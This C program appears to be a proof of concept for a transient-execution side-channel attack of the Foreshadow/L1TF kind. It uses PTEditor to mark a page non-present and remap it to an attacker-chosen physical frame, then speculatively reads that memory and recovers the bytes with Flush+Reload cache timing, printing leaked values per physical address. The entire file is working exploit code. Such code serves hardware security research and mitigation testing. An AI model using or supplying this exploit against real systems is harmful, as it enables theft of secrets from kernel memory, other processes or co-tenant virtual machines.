#include "constants.h"
#include "flush_and_reload.h"
#include <bits/types/siginfo_t.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <ucontext.h>
#include <unistd.h>

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop

#include <assert.h>

extern uint64_t reload_label(void);

#define REG_RIP 16
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
static void segfault_handler(int sig, siginfo_t *info, void *ucontext) {
  ucontext_t *uc = (ucontext_t *)ucontext;
  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
  *rip = (uint64_t)&reload_label;
}
#pragma GCC diagnostic pop

int main(int argc, char *argv[argc]) {
  // Step 1: Create a variable
  // Step 2: modify PTE to change make page containing that variable non-present
  //         optionally modify the PTE physical page
  // Step 3: FLUSH reload buffer
  // Step 4: Speculatively access variable
  // Step 5: RELOAD reload buffer
  assert(argc > 0);
  if (argc != 3) {
    fprintf(stderr, "Usage: %s [physical address to leak in hex] [length]\n",
            argv[0]);
    exit(1);
  }

  char *tail = NULL;
  uintptr_t phys_addr = strtoull(argv[1], &tail, 16);
  assert(tail != argv[1]);
  size_t pfn = (phys_addr & ~(0xfff)) >> 0xc;

  tail = NULL;
  size_t length = strtoull(argv[2], &tail, 10);
  assert(tail != argv[2]);
  assert((phys_addr & 0xfff) + length < PAGE_SIZE);

  fprintf(stderr, "Attempting to leak %ld bytes from %p\n", length,
          (void *)phys_addr);

  void *leak = mmap(NULL, PAGE_SIZE, PROT_WRITE | PROT_READ,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  void *reload_buffer =
      mmap(NULL, VALUES_IN_BYTE * PAGE_SIZE, PROT_WRITE | PROT_READ,
           MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
  assert(reload_buffer != MAP_FAILED);

  size_t threshold = 150;

  // Modify the PFN
  assert(!ptedit_init());
  assert(!mprotect(leak, PAGE_SIZE, PROT_NONE));
  size_t leak_original_pfn = ptedit_pte_get_pfn(leak, 0);
  ptedit_pte_clear_bit(leak, 0, PTEDIT_PAGE_BIT_PRESENT);
  ptedit_pte_set_pfn(leak, 0, pfn);

  struct sigaction sa = {0};
  sa.sa_handler = (void *)segfault_handler;
  sigaction(SIGSEGV, &sa, NULL);

  memset(reload_buffer, 0, VALUES_IN_BYTE * PAGE_SIZE);

  size_t start = (phys_addr & 0xfff);
  for (size_t j = start; j < start + length; j += 1) {
    size_t results[VALUES_IN_BYTE] = {0};
    void *leak_addr = (char *)leak + j;

    // printf("pfn after set %lx\n", ptedit_pte_get_pfn(leak, 0));

    for (int i = 0; i < 100; ++i) {
      flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
      asm volatile("xor %%rax, %%rax\n"
                   "movb (%0), %%al\n"
                   "shl $0xc, %%eax\n"
                   "prefetcht0 (%1, %%rax)\n"
                   "mfence\n"
                   "loop:\n"
                   "pause\n"
                   "jmp loop\n"
                   ".global reload_label\n"
                   "reload_label:"

                   ::"r"(leak_addr),
                   "r"(reload_buffer)
                   : "rax");
      reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);
    }

    for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
      if (results[i] > 0) {
        printf("Results physcial addr %lx:\t", (pfn << 12) | j);
        printf("0x%lx\t%ld\n", i, results[i]);
      }
    }
  }
  // Restore the segfault handler back to normal
  sa.sa_handler = SIG_DFL;
  sigaction(SIGSEGV, &sa, NULL);

  // Restore leak PFN before munmapping the buffer
  ptedit_pte_set_pfn(leak, 0, leak_original_pfn);
  assert(!munmap(leak, PAGE_SIZE));
  assert(!munmap(reload_buffer, VALUES_IN_BYTE * PAGE_SIZE));
  ptedit_cleanup();
}
